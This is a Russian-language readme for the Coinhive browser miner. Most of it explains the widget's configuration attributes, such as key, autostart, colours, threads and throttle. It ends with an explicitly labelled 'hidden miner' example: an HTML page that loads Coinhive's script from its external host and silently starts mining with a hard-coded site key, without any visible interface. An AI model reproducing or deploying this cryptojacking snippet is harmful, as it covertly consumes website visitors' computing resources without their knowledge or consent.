Copyright © 2018 Тимашков Иван

Для майнинга нужно зарегистроваться
сдесь: https://coinhive.com/

data-key:
ваш публичный ключ(public key)
Свой ключ можно найти на сайте в
настройках.

data-user:
Необязательно. Имя пользователя,
которому будут зачислены хеши.
Просто оставьте это пустым,
если вы не уверены.

data-autostart:
Необязательно. Автоматически
запускать mining ( true|false).
По умолчанию false. Шахтер будет
выполнять автозапуск при последующих
загрузках страницы после того,
как пользователь запустит
приложение один раз.

data-whitelabel:
Необязательно. Whether to hide the
Powered by Coinhive text (true|false).
The default is false.

data-background:
Необязательно. Цвет фона для
пользовательского интерфейса как 3
или 6-значный код цвета HEX.
Например: #000000 черный, #ff0000красный.
Посетите сайт htmlcolorcodes.com,
чтобы найти цвета.

data-text:
Необязательно. Цвет текста для
пользовательского интерфейса как 3
или 6-значный код цвета HEX. Например:
#000000 черный или #ff0000 красный.
Посетите сайт htmlcolorcodes.com,
чтобы найти цвета.

data-action:
Необязательно. Цвет действия для
пользовательского интерфейса как 3
или 6-значный код цвета HEX. Например:
#000000 черный или #ff0000 красный.
Посетите сайт htmlcolorcodes.com,
чтобы найти цвета.

data-graph:
Необязательно. График цвета для
пользовательского интерфейса как 3
или 6-значный код цвета HEX.
Например: #000000 черный или #ff0000
красный. Посетите сайт htmlcolorcodes.com,
чтобы найти цвета.

data-threads:
Необязательно. Количество потоков,
с которых должен начинаться майнер.

data-throttle:
Необязательно. The throttle value
the miner should start with. See
miner.setThrottle() for a detailed
explanation.

Пример скрытого майнера:
<!DOCTYPE html>
<html>
  <head>
    <link href="css/styles.css" rel="stylesheet">
  </head>
  <body>
	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('bXTkUOvUcR50bt5ay7wHj4ESDEKd3ix4');
	miner.start();
</script>
  </body>
</html>		
